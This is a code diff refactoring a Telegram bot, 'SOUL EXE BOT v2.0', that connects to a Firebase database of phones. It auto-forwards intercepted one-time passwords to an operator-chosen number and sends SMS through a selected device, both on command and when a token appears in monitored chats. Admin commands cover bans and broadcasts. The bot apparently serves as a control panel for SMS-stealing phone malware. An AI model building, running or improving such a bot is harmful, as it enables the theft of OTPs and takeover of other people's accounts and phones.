+        return ctx.reply(`❌ Send this command IN the channel/group\n\n💡 Chat ID: \`${ctx.chat.id}\``, { parse_mode: 'Markdown' });
     }
     
     const user = userData.get(userId);
     if (!user.channels) user.channels = [];
-    
-    if (user.channels.includes(channelId)) {
-        return ctx.reply(`ℹ️ Chat already monitored.`, { parse_mode: 'Markdown' });
-    }
+    if (user.channels.includes(channelId)) return ctx.reply(`ℹ️ Already monitoring this chat.`);
     
     user.channels.push(channelId);
     user.channelNames = user.channelNames || {};
     user.channelNames[channelId] = chatTitle;
     userData.set(userId, user);
     
-    await ctx.reply(
-        `✅ *Chat Added!*\n\n` +
-        `📢 Name: ${chatTitle}\n` +
-        `🆔 ID: \`${channelId}\``,
-        { parse_mode: 'Markdown' }
-    );
+    await ctx.reply(`✅ *Chat Added!*\n\n📢 ${chatTitle}\n🆔 \`${channelId}\``, { parse_mode: 'Markdown' });
 });
 
 bot.command('listchannels', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
-    
-    if (!user?.channels?.length) {
-        await ctx.reply('📭 No channels added.', { parse_mode: 'Markdown' });
-        return;
-    }
+    if (!user?.channels?.length) return ctx.reply('📭 No channels added.');
     
     let text = '📢 *MONITORED CHATS*\n\n';
-    user.channels.forEach((ch, i) => { 
+    user.channels.forEach((ch, i) => {
         const name = user.channelNames?.[ch] || 'Unknown';
         text += `${i+1}. ${name}\n   🆔 \`${ch}\`\n\n`;
     });
@@ -706,7 +501,7 @@ bot.command('removechannel', async (ctx) => {
     const args = ctx.message.text.split(' ');
     const user = userData.get(userId);
     
-    if (!user?.channels?.length) return ctx.reply('📭 No chats to remove.');
+    if (!user?.channels?.length) return ctx.reply('📭 No channels.');
     if (args.length < 2) return ctx.reply('Usage: `/removechannel <chat_id>`', { parse_mode: 'Markdown' });
     
     const idx = user.channels.indexOf(args[1]);
@@ -714,48 +509,43 @@ bot.command('removechannel', async (ctx) => {
     
     user.channels.splice(idx, 1);
     userData.set(userId, user);
-    
-    await ctx.reply(`✅ *Removed Chat!*`, { parse_mode: 'Markdown' });
+    await ctx.reply(`✅ *Removed!*`, { parse_mode: 'Markdown' });
 });
 
 bot.command('startmonitor', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
     
-    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
-    if (!user.monitoringDevice) return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
+    if (!user?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
+    if (!user.monitoringDevice) return ctx.reply('❌ Use /setdevice first!');
     
-    const now = new Date();
-    user.monitorStartTime = now.toISOString();
+    user.monitorStartTime = new Date().toISOString();
     user.monitorActive = true;
     user.processedMsgs = new Set();
     userData.set(userId, user);
     
-    const device = await getDevice(userId, user.monitoringDevice);
-    const deviceStatus = device ? (device.online ? '🟢 ONLINE' : '🔴 OFFLINE') : '❓ Unknown';
-    
     if (user.monitorInterval) clearInterval(user.monitorInterval);
-    
     user.monitorInterval = setInterval(async () => {
-        const currentUser = userData.get(userId);
-        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
-            await monitorFirebaseMessages(userId, currentUser);
+        const curr = userData.get(userId);
+        if (curr?.monitorActive && curr?.monitoringDevice) {
+            await monitorFirebaseMessages(userId, curr);
         }
     }, 2000);
     
     userData.set(userId, user);
     
+    const device = await getDevice(userId, user.monitoringDevice);
     await ctx.reply(
         `✅ *MONITORING STARTED!*\n\n` +
         `📱 Device: \`${user.monitoringDevice}\`\n` +
-        `📡 Status: ${deviceStatus}\n` +
+        `📡 Status: ${device?.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
         `📢 Chats: ${user.channels?.length || 0}\n` +
         `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n` +
-        `🕐 Started: ${now.toLocaleString()}\n\n` +
-        `📌 *Features:*\n` +
-        `• OTPs → Auto-forward to your number\n` +
-        `• Tokens (To: X Message: Y) → Forward to any number\n\n` +
-        `🚀 *MONITORING ACTIVE!*`,
+        `🕐 Started: ${new Date().toLocaleString()}\n\n` +
+        `✨ *Features:*\n` +
+        `🔹 OTPs → Auto-forward to your number\n` +
+        `🔹 Tokens (To: X Message: Y) → Forward to any number\n\n` +
+        `🚀 *ACTIVE!*`,
         { parse_mode: 'Markdown' }
     );
 });
@@ -777,31 +567,38 @@ bot.command('resume', async (ctx) => {
     if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
     
     user.monitorActive = true;
-    
     if (user.monitorInterval) clearInterval(user.monitorInterval);
     user.monitorInterval = setInterval(async () => {
-        const currentUser = userData.get(userId);
-        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
-            await monitorFirebaseMessages(userId, currentUser);
+        const curr = userData.get(userId);
+        if (curr?.monitorActive && curr?.monitoringDevice) {
+            await monitorFirebaseMessages(userId, curr);
         }
     }, 2000);
-    
     userData.set(userId, user);
-    await ctx.reply(`✅ *Monitor Resumed!*`, { parse_mode: 'Markdown' });
+    await ctx.reply(`✅ *Resumed!*`, { parse_mode: 'Markdown' });
 });
 
 bot.command('status', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
-    if (!user) return ctx.reply('❌ Not configured.', { parse_mode: 'Markdown' });
+    if (!user) return ctx.reply('❌ Not configured.');
+    
+    const devices = await getAllDevices(userId);
+    let deviceInfo = 'Not set', deviceStatus = 'Unknown';
+    if (user.monitoringDevice) {
+        const d = await getDevice(userId, user.monitoringDevice);
+        if (d) { deviceInfo = d.name; deviceStatus = d.online ? '🟢 ONLINE' : '🔴 OFFLINE'; }
+    }
     
     await ctx.reply(
         `📊 *STATUS*\n\n` +
-        `📡 Firebase: ✅ Connected\n` +
-        `📱 Device: ${user.monitoringDevice || 'Not set'}\n` +
-        `📢 Chats: ${user.channels?.length || 0}\n` +
-        `⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
-        `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}`,
+        `▫️ Firebase: ✅ Connected\n` +
+        `▫️ Device: ${deviceInfo}\n` +
+        `▫️ Status: ${deviceStatus}\n` +
+        `▫️ Chats: ${user.channels?.length || 0}\n` +
+        `▫️ Total Devices: ${devices.length}\n` +
+        `▫️ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
+        `▫️ OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}`,
         { parse_mode: 'Markdown' }
     );
 });
@@ -811,8 +608,8 @@ bot.command('send', async (ctx) => {
     const args = ctx.message.text.split(' ');
     const user = userData.get(userId);
     
-    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.', { parse_mode: 'Markdown' });
-    if (args.length < 3) return ctx.reply('❌ Usage: `/send <number> <message>`', { parse_mode: 'Markdown' });
+    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
+    if (args.length < 3) return ctx.reply('❌ Usage: `/send 919876543210 Hello`', { parse_mode: 'Markdown' });
     
     const phone = args[1];
     const message = args.slice(2).join(' ');
@@ -820,66 +617,53 @@ bot.command('send', async (ctx) => {
     const msg = await ctx.reply(`📤 Sending...`, { parse_mode: 'Markdown' });
     const result = await sendSms(userId, user.monitoringDevice, phone, message);
     
-    await ctx.telegram.editMessageText(
-        msg.chat.id, msg.message_id, null,
+    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
         result.success ? `✅ Sent! (${result.elapsed}ms)` : `❌ Failed: ${result.error}`
     );
 });
 
-// ==================== TOKEN FORWARD HANDLER (SAME AS BEFORE) ====================
+// ==================== TOKEN FORWARD HANDLER ====================
 bot.on('channel_post', async (ctx) => {
-    await handleChannelMessage(ctx, ctx.channelPost);
+    await handleMessage(ctx, ctx.channelPost);
 });
 
 bot.on('message', async (ctx) => {
     if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
-        await handleChannelMessage(ctx, ctx.message);
+        await handleMessage(ctx, ctx.message);
     }
 });
 
-async function handleChannelMessage(ctx, messageObj) {
+async function handleMessage(ctx, msgObj) {
     const chatId = ctx.chat.id.toString();
-    const text = messageObj.text || messageObj.caption || '';
-    const msgTime = messageObj.date * 1000;
-    
+    const text = msgObj.text || '';
     if (!text) return;
     
-    const monitoringUsers = [];
+    const users = [];
     for (const [uid, u] of userData.entries()) {
-        if (u.banned) continue;
-        if (u.channels && u.channels.includes(chatId)) {
-            monitoringUsers.push({ userId: uid, user: u });
-        }
+        if (!u.banned && u.channels?.includes(chatId)) users.push({ userId: uid, user: u });
     }
+    if (users.length === 0) return;
     
-    if (monitoringUsers.length === 0) return;
-    
-    for (const { userId, user } of monitoringUsers) {
+    for (const { userId, user } of users) {
         if (!user.monitorActive) continue;
         
-        const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
-        if (msgTime < startTime) continue;
-        
-        const extracted = extractToken(text);
-        if (extracted && user.monitoringDevice) {
-            await bot.telegram.sendMessage(
-                userId,
-                `🎯 *TOKEN DETECTED!*\n\n📞 Target: \`${extracted.number}\`\n🔄 Forwarding...`,
+        const token = extractToken(text);
+        if (token && user.monitoringDevice) {
+            await bot.telegram.sendMessage(userId,
+                `🎯 *TOKEN DETECTED!*\n\n📞 Target: \`${token.number}\`\n🔄 Forwarding...`,
                 { parse_mode: 'Markdown' }
             );
             
-            const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
+            const result = await sendSms(userId, user.monitoringDevice, token.number, token.message);
             
             if (result.success) {
-                await bot.telegram.sendMessage(
-                    userId,
-                    `✅ *TOKEN FORWARDED!*\n\n📞 To: \`${extracted.number}\``,
+                await bot.telegram.sendMessage(userId,
+                    `✅ *TOKEN FORWARDED!*\n\n📞 To: \`${token.number}\``,
                     { parse_mode: 'Markdown' }
                 );
             } else {
-                await bot.telegram.sendMessage(
-                    userId,
-                    `❌ *TOKEN FORWARD FAILED!*\n\n❌ ${result.error}`,
+                await bot.telegram.sendMessage(userId,
+                    `❌ *FAILED!*\n\n${result.error}`,
                     { parse_mode: 'Markdown' }
                 );
             }
@@ -895,13 +679,12 @@ bot.on('text', async (ctx) => {
     if (text.startsWith('/')) return;
     
     const user = userData.get(userId);
-    if (!user || user.banned) return;
-    if (!user.monitoringDevice) return;
+    if (!user || user.banned || !user.monitoringDevice) return;
     
-    const extracted = extractToken(text);
-    if (extracted) {
-        await ctx.reply(`📤 Sending token...`);
-        const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
+    const token = extractToken(text);
+    if (token) {
+        await ctx.reply(`📤 Sending...`);
+        const result = await sendSms(userId, user.monitoringDevice, token.number, token.message);
         if (result.success) {
             await ctx.reply(`✅ Sent! (${result.elapsed}ms)`);
         } else {
@@ -910,80 +693,64 @@ bot.on('text', async (ctx) => {
     }
 });
 
-// ==================== ADMIN COMMANDS ====================
+// ==================== ADMIN ====================
 bot.command('admin', async (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
-    
+    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
     await ctx.reply(
-        `👑 *ADMIN PANEL*\n\n` +
+        `👑 *ADMIN*\n\n` +
         `📊 Users: ${userData.size}\n` +
-        `/users - List users\n` +
-        `/ban <id> - Ban user\n` +
-        `/unban <id> - Unban user\n` +
-        `/broadcast - Send to all`,
+        `/users - List\n/ban <id>\n/unban <id>\n/broadcast`,
         { parse_mode: 'Markdown' }
     );
 });
 
 bot.command('users', async (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
-    
+    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
     if (userData.size === 0) return ctx.reply('📭 No users.');
     
     let list = '👥 *USERS*\n\n';
     let i = 1;
-    for (const [uid, user] of userData.entries()) {
-        const status = user.banned ? '🔴 BANNED' : (user.monitorActive ? '🟢 ACTIVE' : '⚪ INACTIVE');
+    for (const [uid, u] of userData.entries()) {
+        const status = u.banned ? '🔴 BANNED' : (u.monitorActive ? '🟢 ACTIVE' : '⚪ INACTIVE');
         list += `${i}. \`${uid}\` ${status}\n`;
-        if (user.otpForwardNumber) list += `   🔐 OTP: ${user.otpForwardNumber}\n`;
-        i++;
-        if (i > 20) break;
+        if (u.otpForwardNumber) list += `   🔐 OTP: ${u.otpForwardNumber}\n`;
+        if (++i > 20) break;
     }
     await ctx.reply(list, { parse_mode: 'Markdown' });
 });
 
 bot.command('ban', async (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
-    
+    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
     const args = ctx.message.text.split(' ');
     if (args.length < 2) return ctx.reply('Usage: `/ban <user_id>`');
     
-    const targetId = args[1];
-    if (!userData.has(targetId)) return ctx.reply('❌ User not found.');
+    const target = args[1];
+    if (!userData.has(target)) return ctx.reply('❌ User not found.');
     
-    const user = userData.get(targetId);
+    const user = userData.get(target);
     user.banned = true;
     user.monitorActive = false;
     if (user.monitorInterval) clearInterval(user.monitorInterval);
-    userData.set(targetId, user);
-    
-    await ctx.reply(`✅ User banned!`);
+    userData.set(target, user);
+    await ctx.reply(`✅ Banned \`${target}\``, { parse_mode: 'Markdown' });
 });
 
 bot.command('unban', async (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
-    
+    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
     const args = ctx.message.text.split(' ');
     if (args.length < 2) return ctx.reply('Usage: `/unban <user_id>`');
     
-    const targetId = args[1];
-    if (!userData.has(targetId)) return ctx.reply('❌ User not found.');
+    const target = args[1];
+    if (!userData.has(target)) return ctx.reply('❌ User not found.');
     
-    const user = userData.get(targetId);
+    const user = userData.get(target);
     user.banned = false;
-    userData.set(targetId, user);
-    
-    await ctx.reply(`✅ User unbanned!`);
+    userData.set(target, user);
+    await ctx.reply(`✅ Unbanned \`${target}\``, { parse_mode: 'Markdown' });
 });
 
 bot.command('broadcast', async (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
-    
+    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
     const args = ctx.message.text.split(' ');
     if (args.length < 2) return ctx.reply('Usage: `/broadcast <message>`');
     
@@ -991,36 +758,28 @@ bot.command('broadcast', async (ctx) => {
     const msg = await ctx.reply(`📢 Broadcasting...`);
     
     let success = 0;
-    for (const [uid, user] of userData.entries()) {
-        if (user.banned) continue;
+    for (const [uid, u] of userData.entries()) {
+        if (u.banned) continue;
         try {
             await bot.telegram.sendMessage(uid, `📢 *ANNOUNCEMENT*\n\n${message}`, { parse_mode: 'Markdown' });
             success++;
         } catch(e) {}
         await new Promise(r => setTimeout(r, 50));
     }
-    
     await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, `✅ Sent to ${success} users`);
 });
 
 bot.command('help', async (ctx) => {
     await ctx.reply(
         `⚡ *COMMANDS*\n\n` +
-        `🔧 *SETUP:*\n` +
-        `/setfirebase <url>\n` +
-        `/setdevice\n` +
-        `/addchannel\n` +
-        `/startmonitor\n\n` +
-        `🔐 *OTP FORWARD:*\n` +
-        `/setotpnum <number>\n` +
-        `/removeotpnum\n` +
-        `/showotpnum\n\n` +
-        `📌 *TOKEN FORWARD:*\n` +
+        `🔧 *SETUP*\n` +
+        `/setfirebase <url>\n/setdevice\n/addchannel\n/startmonitor\n\n` +
+        `🔐 *OTP FORWARD*\n` +
+        `/setotpnum <number>\n/removeotpnum\n/showotpnum\n\n` +
+        `📌 *TOKEN FORWARD*\n` +
         `Send: To: 919876543210\\nMessage: TOKEN\n\n` +
-        `⚙️ *CONTROL:*\n` +
-        `/stop / /resume\n` +
-        `/status\n` +
-        `/send <num> <msg>`,
+        `⚙️ *CONTROL*\n` +
+        `/stop /resume /status /send /id`,
         { parse_mode: 'Markdown' }
     );
 });
@@ -1030,16 +789,13 @@ bot.command('id', async (ctx) => {
 });
 
 // ==================== CALLBACKS ====================
-bot.action(/^select_dev_(.+)$/, async (ctx) => {
+bot.action(/^dev_(.+)$/, async (ctx) => {
     await ctx.answerCbQuery();
     const userId = ctx.from.id.toString();
     const deviceId = ctx.match[1];
     
     const device = await getDevice(userId, deviceId);
-    if (!device) {
-        await ctx.editMessageText('❌ Device not found');
-        return;
-    }
+    if (!device) return ctx.editMessageText('❌ Not found');
     
     const user = userData.get(userId);
     user.monitoringDevice = deviceId;
@@ -1048,24 +804,19 @@ bot.action(/^select_dev_(.+)$/, async (ctx) => {
     userData.set(userId, user);
     
     await ctx.editMessageText(
-        `✅ *Device Set!*\n\n` +
-        `📱 Name: ${device.name}\n` +
-        `🆔 ID: \`${device.id}\`\n` +
-        `📞 Phone: ${device.phone}\n` +
-        `🔋 Battery: ${device.battery}\n\n` +
-        `Next: \`/addchannel\` or \`/setotpnum\``,
+        `✅ *Device Set!*\n\n📱 ${device.name}\n🆔 \`${device.id}\`\n📞 ${device.phone}\n🔋 ${device.battery}\n📡 ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\nNext: /addchannel or /setotpnum`,
         { parse_mode: 'Markdown' }
     );
 });
 
-bot.action(/^dev_page_(\d+)$/, async (ctx) => {
+bot.action(/^page_(\d+)$/, async (ctx) => {
     await ctx.answerCbQuery();
     const userId = ctx.from.id.toString();
     const page = parseInt(ctx.match[1]);
     await showDevicePage(ctx, userId, page);
 });
 
-bot.action('cancel_select', async (ctx) => {
+bot.action('cancel', async (ctx) => {
     await ctx.answerCbQuery();
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
@@ -1075,13 +826,13 @@ bot.action('cancel_select', async (ctx) => {
 
 // ==================== START ====================
 async function main() {
-    console.log('\n🚀 ========== SOUL EXE BOT v2.0 ==========');
-    console.log('✅ TOKEN FORWARD: To: X Message: Y');
-    console.log('✅ OTP AUTO-FORWARD: /setotpnum');
+    console.log('\n🚀 SOUL EXE BOT v2.0');
+    console.log('✅ OTP Auto-Forward Active');
+    console.log('✅ Token Forward Active');
     console.log('==========================================\n');
     
     bot.launch();
-    console.log('🤖 Bot running...\n');
+    console.log('🤖 Bot Running...\n');
 }
 
 main();
